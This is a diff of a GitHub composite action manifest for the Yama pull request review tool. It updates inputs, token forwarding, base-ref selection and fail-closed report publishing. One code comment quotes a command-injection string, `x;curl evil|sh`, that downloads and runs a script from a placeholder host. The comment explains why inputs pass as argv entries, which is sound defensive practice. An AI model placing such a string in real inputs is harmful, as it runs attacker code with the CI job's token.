@@ -7,82 +7,90 @@ description: "Pull request review that reads the checked-out repository, posts w
 #     code from disk rather than through the VCS API — that is why a run needs
 #     tens of tool calls instead of hundreds.
 #  2. `fetch-depth: 0` (or at least enough history to reach the base) — the
-#     change set comes from `git diff base...head`.
+#     change set comes from `git diff merge-base(base, head)..head`.
+#
+# It also expects a `.yama/` directory in the checkout: `yama.yaml` and `mcp.yaml`
+# are required, everything else is optional and an absent piece switches a
+# capability off rather than breaking the run. `npx yama init` scaffolds one.
 
 inputs:
   pr:
     description: "Pull request number. Defaults to the triggering pull request."
     required: false
   branch:
-    description: "Branch to review. Yama resolves its pull request; ambiguity is reported, never guessed."
+    description: "Branch to review against its base, when there is no pull request."
     required: false
-  config:
-    description: "Config directory. Point it outside the checkout when reviewing untrusted pull requests."
+  base:
+    description: >
+      Ref the change is going into; the diff is merge-base(base, head)..head.
+      Defaults to origin/<the runner's GITHUB_BASE_REF> on a pull_request event,
+      and to the remote's default branch otherwise.
     required: false
-    default: ".yama"
   yama-version:
     description: >
       npm version range to install. Pinned to the major this action's inputs and
-      config shape belong to: installing "latest" would silently run an older
-      major against a v4 config, which fails in ways that look like a broken
-      review rather than a version mismatch.
+      config shape belong to: installing "latest" would silently run a different
+      major against a v5 config directory, which fails in ways that look like a
+      broken review rather than a version mismatch.
     required: false
-    default: "^4.0.0"
+    default: "^5.0.0"
   dry-run:
     description: "Analyse and report without posting anything."
     required: false
     default: "false"
-  concurrency:
-    description: "How much parallelism the agent may command: high | medium | low."
-    required: false
-    default: "medium"
-  verdict:
-    description: "Set false to review without an approve/block decision."
-    required: false
-    default: "true"
-  checks:
-    description: "Set false to skip configured checks for this run."
-    required: false
-    default: "true"
   vcs-token:
     description: >
-      Token for the VCS MCP server. Pass it through a NON-reserved env name —
-      ${{ secrets.GITHUB_TOKEN }} is unreliable inside a composite action.
+      Token for the VCS MCP server, forwarded to the run as both GITHUB_TOKEN and
+      YAMA_GITHUB_TOKEN so either name works in .yama/mcp.yaml. Pass it through a
+      NON-reserved env name in the calling workflow — the reserved GitHub token is
+      not reliably forwarded into a composite action, and the failure surfaces much
+      later as an opaque remote 401.
+
+      Never write that value with GitHub-Actions expression braces anywhere in this
+      manifest: the runner evaluates such expressions even inside description
+      strings, the secrets context does not exist at manifest load, and the whole
+      action then fails to load with "Unrecognized named-value: secrets".
+      scripts/build-validations.cjs fails the build if one appears here.
     required: false
   fail-on-blocked:
-    description: "Exit non-zero when the verdict is BLOCKED."
+    description: "Exit non-zero when the verdict is `block`."
     required: false
     default: "true"
   node-version:
-    description: "Node version."
+    description: "Node version. Yama requires 22 or newer."
     required: false
     default: "22"
 
-# Every value here comes from the run report the CLI writes to
-# .yama/reports/<runId>.json, read by the "Publish the run report" step below.
-# They were previously bound to the review step, which writes nothing to
-# $GITHUB_OUTPUT — so all six were permanently empty and `fail-on-blocked` could
-# never fire, which made a blocked review indistinguishable from a clean one.
+# Every value here comes from the review result the CLI writes with `--json`,
+# read by the "Publish the run report" step below. They were once bound to the
+# review step, which writes nothing to $GITHUB_OUTPUT — so all of them were
+# permanently empty and `fail-on-blocked` could never fire, which made a blocked
+# review indistinguishable from a clean one.
 outputs:
   decision:
-    description: "APPROVED | CHANGES_REQUESTED | BLOCKED"
+    description: "approve | comment | block"
     value: ${{ steps.report.outputs.decision }}
+  findings:
+    description: "Findings the run ranked, after dedupe."
+    value: ${{ steps.report.outputs.findings }}
+  critical:
+    description: "Ranked findings at CRITICAL."
+    value: ${{ steps.report.outputs.critical }}
+  major:
+    description: "Ranked findings at MAJOR."
+    value: ${{ steps.report.outputs.major }}
   posted:
     description: "Comments actually posted, counted from the posting tool's results."
     value: ${{ steps.report.outputs.posted }}
-  critical:
-    description: "Critical findings posted."
-    value: ${{ steps.report.outputs.critical }}
-  major:
-    description: "Major findings posted."
-    value: ${{ steps.report.outputs.major }}
   partial:
-    description: "True when a stage did not complete — the review cannot vouch for the whole change."
+    description: >
+      True when the run stopped early or left checklist items unaccounted for —
+      the review cannot vouch for the whole change.
     value: ${{ steps.report.outputs.partial }}
   summary:
     description: >
       The verdict and the reasons behind it. The summary COMMENT body lives on
-      the pull request; the run report carries the decision and its reasons.
+      the pull request; this is the decision and its reasons.
     value: ${{ steps.report.outputs.summary }}
 
 runs:
@@ -102,14 +110,19 @@ runs:
         if [ "$(git rev-parse --is-shallow-repository)" = "true" ]; then
           echo "::warning::This is a shallow clone. Yama needs history to compute the diff against the base. Use fetch-depth: 0."
         fi
+        if [ ! -d .yama ]; then
+          echo "::error::No .yama/ directory in the checkout. Run \`npx yama init\` and commit the result, or point this action at a repository that has one."
+          exit 1
+        fi
 
     - uses: actions/setup-node@v4
       with:
         node-version: ${{ inputs.node-version }}
 
-    - name: Restore this pull request's artifact
-      # Carries what earlier runs on this pull request established. Absent is
-      # fine — comment markers still carry deduplication.
+    - name: Restore this pull request's run store
+      # Carries what earlier runs on this pull request established, so a
+      # re-review is incremental. Absent is fine — comment markers still carry
+      # deduplication, and the run rebuilds the rest.
       #
       # Located through the API rather than with `actions/download-artifact`:
       # that action only sees artifacts from the CURRENT run, and the one needed
@@ -117,23 +130,29 @@ runs:
       # restored nothing, silently, on every re-run.
       continue-on-error: true
       shell: bash
+      working-directory: ${{ github.workspace }}
       env:
         GH_TOKEN: ${{ inputs.vcs-token }}
+        GH_REPO: ${{ github.repository }}
         PR_NUMBER: ${{ inputs.pr || github.event.pull_request.number }}
       run: |
         set -euo pipefail
-        name="yama-pr-${PR_NUMBER}"
-        id=$(gh api "repos/${{ github.repository }}/actions/artifacts?per_page=100" \
+        if [ -z "${PR_NUMBER:-}" ]; then
+          echo "No pull request number — nothing to restore."
+          exit 0
+        fi
+        name="yama-store-pr-${PR_NUMBER}"
+        id=$(gh api "repos/${GH_REPO}/actions/artifacts?per_page=100" \
                --jq "[.artifacts[] | select(.name == \"$name\" and .expired == false)]
                      | sort_by(.created_at) | reverse | .[0].id // empty")
         if [ -z "$id" ]; then
-          echo "No previous memory for this pull request — reviewing from comment markers."
+          echo "No previous run store for this pull request — reviewing from comment markers."
           exit 0
         fi
-        mkdir -p .yama/state
-        gh api "repos/${{ github.repository }}/actions/artifacts/$id/zip" > /tmp/yama-memory.zip
-        unzip -o -q /tmp/yama-memory.zip -d .yama/state
-        echo "Restored memory from artifact $id."
+        mkdir -p .yama/artifacts
+        gh api "repos/${GH_REPO}/actions/artifacts/$id/zip" > "${RUNNER_TEMP}/yama-store.zip"
+        unzip -o -q "${RUNNER_TEMP}/yama-store.zip" -d .yama/artifacts
+        echo "Restored the run store from artifact $id."
 
     - name: Verify the setup
       shell: bash
@@ -141,20 +160,29 @@ runs:
       env:
         # Exported under both names on purpose. A capability map names the env
         # var it interpolates, and the two conventions in the wild are
-        # ${YAMA_VCS_TOKEN} (provider-neutral) and ${YAMA_GITHUB_TOKEN} (what
-        # this repo's reference .yama/mcp.yaml and yama-review.yml use). Exporting
-        # one of them meant the other config style authenticated with an empty
-        # string and failed at the first API call.
-        YAMA_VCS_TOKEN: ${{ inputs.vcs-token }}
+        # ${GITHUB_TOKEN} (what the shipped templates/mcp.github.yaml uses) and
+        # ${YAMA_GITHUB_TOKEN} (a non-reserved name, which is what a workflow
+        # should pass). Exporting one of them meant the other config style
+        # authenticated with an empty string and failed at the first API call.
+        GITHUB_TOKEN: ${{ inputs.vcs-token }}
         YAMA_GITHUB_TOKEN: ${{ inputs.vcs-token }}
-        YAMA_INPUT_DRY_RUN: ${{ inputs.dry-run }}
+        # The shipped capability map pins owner and repo as call arguments, and
+        # an unset ${VAR} in .yama/mcp.yaml is a hard config error, not a
+        # default. These are repository coordinates, not credentials.
+        GITHUB_OWNER: ${{ github.repository_owner }}
+        GITHUB_REPO: ${{ github.event.repository.name }}
+        YAMA_INPUT_PR: ${{ inputs.pr || github.event.pull_request.number }}
+        YAMA_INPUT_BRANCH: ${{ inputs.branch }}
         YAMA_INPUT_VERSION: ${{ inputs.yama-version }}
       run: |
         set -euo pipefail
-        # Everything expensive that can fail late is checked here instead:
-        # connections, credentials, and every capability the run will need.
+        # Everything expensive that can fail late is checked here instead: the
+        # config, the MCP connections, the credentials, and every capability the
+        # run will need, probed against the tools the servers really advertise.
+        # `doctor` exits 2 when something it needs is missing or broken.
         DOCTOR_ARGS=(doctor)
-        if [ "$YAMA_INPUT_DRY_RUN" != "true" ]; then DOCTOR_ARGS+=(--live); fi
+        if [ -n "${YAMA_INPUT_PR:-}" ]; then DOCTOR_ARGS+=(--pr "$YAMA_INPUT_PR"); fi
+        if [ -n "${YAMA_INPUT_BRANCH:-}" ]; then DOCTOR_ARGS+=(--branch "$YAMA_INPUT_BRANCH"); fi
         npx --yes "@juspay/yama@$YAMA_INPUT_VERSION" "${DOCTOR_ARGS[@]}"
 
     - name: Review
@@ -163,23 +191,14 @@ runs:
       working-directory: ${{ github.workspace }}
       env:
         # Both names — see the note on the previous step.
-        YAMA_VCS_TOKEN: ${{ inputs.vcs-token }}
+        GITHUB_TOKEN: ${{ inputs.vcs-token }}
         YAMA_GITHUB_TOKEN: ${{ inputs.vcs-token }}
-        YAMA_CONCURRENCY: ${{ inputs.concurrency }}
-        YAMA_VERDICT: ${{ inputs.verdict }}
-        YAMA_CHECKS: ${{ inputs.checks }}
-        # Fork pull requests carry untrusted code. Check execution stays off for
-        # them regardless of configuration — but only if the process can tell.
-        # `isForkPullRequest` (src/v4/config/defaults.ts) decides by comparing the
-        # head repository against the base one, so those are the two names that
-        # have to arrive. GITHUB_HEAD_REPOSITORY is not a runner default and is
-        # empty for a non-pull-request event, which the comparison handles.
-        GITHUB_HEAD_REPOSITORY: ${{ github.event.pull_request.head.repo.full_name }}
-        GITHUB_REPOSITORY: ${{ github.repository }}
-        YAMA_INPUT_PR: ${{ inputs.pr }}
+        GITHUB_OWNER: ${{ github.repository_owner }}
+        GITHUB_REPO: ${{ github.event.repository.name }}
+        YAMA_INPUT_PR: ${{ inputs.pr || github.event.pull_request.number }}
         YAMA_INPUT_BRANCH: ${{ inputs.branch }}
+        YAMA_INPUT_BASE: ${{ inputs.base }}
         YAMA_INPUT_DRY_RUN: ${{ inputs.dry-run }}
-        YAMA_INPUT_CONFIG: ${{ inputs.config }}
         YAMA_INPUT_VERSION: ${{ inputs.yama-version }}
       run: |
         set -euo pipefail
@@ -189,59 +208,94 @@ runs:
         # `x;curl evil|sh` interpolated here would execute with the job's
         # token before Yama ever starts.
         ARGS=(review)
-        if [ -n "$YAMA_INPUT_PR" ]; then ARGS+=(--pr "$YAMA_INPUT_PR"); fi
-        if [ -n "$YAMA_INPUT_BRANCH" ]; then ARGS+=(--branch "$YAMA_INPUT_BRANCH"); fi
+        if [ -n "${YAMA_INPUT_PR:-}" ]; then ARGS+=(--pr "$YAMA_INPUT_PR"); fi
+        if [ -n "${YAMA_INPUT_BRANCH:-}" ]; then ARGS+=(--branch "$YAMA_INPUT_BRANCH"); fi
+        # The base decides two things: the diff, and WHICH .yama/checks.yaml the
+        # run is allowed to execute — checks are read at the base ref, so a fork
+        # cannot introduce a command by adding it in the pull request. Without a
+        # base, Yama falls back to the remote's default branch, so any repository
+        # whose pull requests target another branch (release, develop) would
+        # review against the wrong ref. GITHUB_BASE_REF is runner-provided, not
+        # attacker-chosen, and reaches the command as a single argv entry.
+        if [ -n "${YAMA_INPUT_BASE:-}" ]; then
+          ARGS+=(--base "$YAMA_INPUT_BASE")
+        elif [ -n "${GITHUB_BASE_REF:-}" ]; then
+          ARGS+=(--base "origin/${GITHUB_BASE_REF}")
+        fi
         if [ "$YAMA_INPUT_DRY_RUN" = "true" ]; then ARGS+=(--dry-run); fi
-        ARGS+=(--config "$YAMA_INPUT_CONFIG")
+        # Written outside the workspace so a review never dirties the checkout.
+        ARGS+=(--json "${RUNNER_TEMP}/yama-review.json")
         npx --yes "@juspay/yama@$YAMA_INPUT_VERSION" "${ARGS[@]}"
 
     - name: Publish the run report
-      # The review writes .yama/reports/<runId>.json (writeRunReport, in
-      # src/v4/core/RunReport.ts) and nothing else to $GITHUB_OUTPUT — so this
-      # step is what turns a finished review into the action's outputs.
+      # `yama review --json` writes the whole review result — ranked findings,
+      # verdict, checklist and run report — and the CLI writes nothing to
+      # $GITHUB_OUTPUT itself, so this step is what turns a finished review into
+      # the action's outputs.
       #
-      # `always()`: a review that failed part-way still wrote a report saying so,
-      # and a caller that gates on `partial` needs to see it. A missing or
-      # unreadable report yields empty outputs and a warning annotation, never a
-      # failed step — the review already happened either way.
+      # `always()`: a review that failed part-way still decided something, and a
+      # caller that gates on `partial` needs to see it.
+      #
+      # Fail-closed: when the review step SUCCEEDED but wrote no result, this step
+      # fails the job. The CLI writes the file on every completed review, dry-run
+      # included — success with nothing written means the review never actually
+      # ran (a bin shim once made the CLI a silent no-op, and warning-only
+      # handling here turned an empty review into a green check). Only when the
+      # review step itself already failed does a missing file stay a warning: the
+      # job is red either way, and the annotation should point at the review's own
+      # error rather than at this step.
       id: report
       if: always()
       shell: bash
       working-directory: ${{ github.workspace }}
+      env:
+        YAMA_REVIEW_OUTCOME: ${{ steps.review.outcome }}
       run: |
         set -euo pipefail
         node -e '
           const fs = require("node:fs");
           const path = require("node:path");
-          const out = { decision: "", posted: "", critical: "", major: "", partial: "", summary: "" };
-          let report;
+          const out = {
+            decision: "", findings: "", critical: "", major: "",
+            posted: "", partial: "", summary: "",
+          };
+          const file = path.join(process.env.RUNNER_TEMP, "yama-review.json");
+          let result;
           try {
-            const newest = fs
-              .readdirSync(path.join(process.cwd(), ".yama", "reports"))
-              .filter((name) => name.endsWith(".json"))
-              .map((name) => path.join(process.cwd(), ".yama", "reports", name))
-              .sort((a, b) => fs.statSync(b).mtimeMs - fs.statSync(a).mtimeMs)[0];
-            if (newest) {
-              report = JSON.parse(fs.readFileSync(newest, "utf8"));
-              console.log("Run report: " + newest);
-            } else {
-              console.log("::warning::No run report under .yama/reports; outputs stay empty.");
-            }
+            result = JSON.parse(fs.readFileSync(file, "utf8"));
           } catch (error) {
-            console.log("::warning::Could not read the run report: " + error.message);
+            if (error.code !== "ENOENT") {
+              console.log("::warning::Could not read the review result: " + error.message);
+            }
           }
-          if (report) {
-            const bySeverity = report.bySeverity || {};
-            const posted = Array.isArray(report.posted) ? report.posted.length : report.posted;
-            const verdict = report.verdict || {};
-            out.decision = report.decision || verdict.decision || "";
-            out.posted = String(typeof posted === "number" ? posted : 0);
-            out.critical = String(bySeverity.CRITICAL || 0);
-            out.major = String(bySeverity.MAJOR || 0);
+          if (!result) {
+            if (process.env.YAMA_REVIEW_OUTCOME === "success") {
+              console.log(
+                "::error::The review step succeeded but wrote no result — " +
+                "the review did not actually run. A suppressed review must " +
+                "never pass as a clean one.",
+              );
+              process.exit(1);
+            }
+            console.log("::warning::No review result was written; outputs stay empty.");
+          }
+          if (result) {
+            const findings = (result.ranked && result.ranked.findings) || [];
+            const verdict = result.verdict || {};
+            const report = result.report || {};
+            const gates = report.gates || {};
+            const delivery = report.delivery || {};
+            const at = (severity) =>
+              String(findings.filter((f) => f.severity === severity).length);
+            out.decision = verdict.decision || "";
+            out.findings = String(findings.length);
+            out.critical = at("CRITICAL");
+            out.major = at("MAJOR");
+            out.posted = String(delivery.posted || 0);
+            // Partial means the run cannot vouch for the whole change: it either
+            // stopped early, or ended with checklist items still unaccounted for.
             out.partial = String(
-              typeof report.partial === "boolean"
-                ? report.partial
-                : Boolean(report.stages && report.stages.partial),
+              report.error !== undefined || gates.checklistComplete === false,
             );
             out.summary = [
               "Verdict: " + (out.decision || "unknown"),
@@ -249,34 +303,34 @@ runs:
             ].join("\n");
           }
           try {
-            const file = process.env.GITHUB_OUTPUT;
+            const outputFile = process.env.GITHUB_OUTPUT;
             const mark = "yama_eof_" + Math.random().toString(36).slice(2);
             const body = Object.entries(out)
               .map(([key, value]) => key + "<<" + mark + "\n" + value + "\n" + mark)
               .join("\n");
-            if (file) { fs.appendFileSync(file, body + "\n"); }
+            if (outputFile) { fs.appendFileSync(outputFile, body + "\n"); }
           } catch (error) {
             console.log("::warning::Could not write step outputs: " + error.message);
           }
           console.log(
-            "decision=" + out.decision + " posted=" + out.posted +
+            "decision=" + out.decision + " findings=" + out.findings +
             " critical=" + out.critical + " major=" + out.major +
-            " partial=" + out.partial,
+            " posted=" + out.posted + " partial=" + out.partial,
           );
         '
 
-    - name: Save this pull request's artifact
+    - name: Save this pull request's run store
       if: always()
       continue-on-error: true
       uses: actions/upload-artifact@v4
       with:
-        name: yama-pr-${{ inputs.pr || github.event.pull_request.number }}
-        path: .yama/state
+        name: yama-store-pr-${{ inputs.pr || github.event.pull_request.number }}
+        path: .yama/artifacts
         retention-days: 30
         overwrite: true
 
     - name: Fail on a blocked verdict
-      if: inputs.fail-on-blocked == 'true' && steps.report.outputs.decision == 'BLOCKED'
+      if: inputs.fail-on-blocked == 'true' && steps.report.outputs.decision == 'block'
       shell: bash
       run: |
         echo "::error::Yama blocked this pull request. See the summary comment for why."
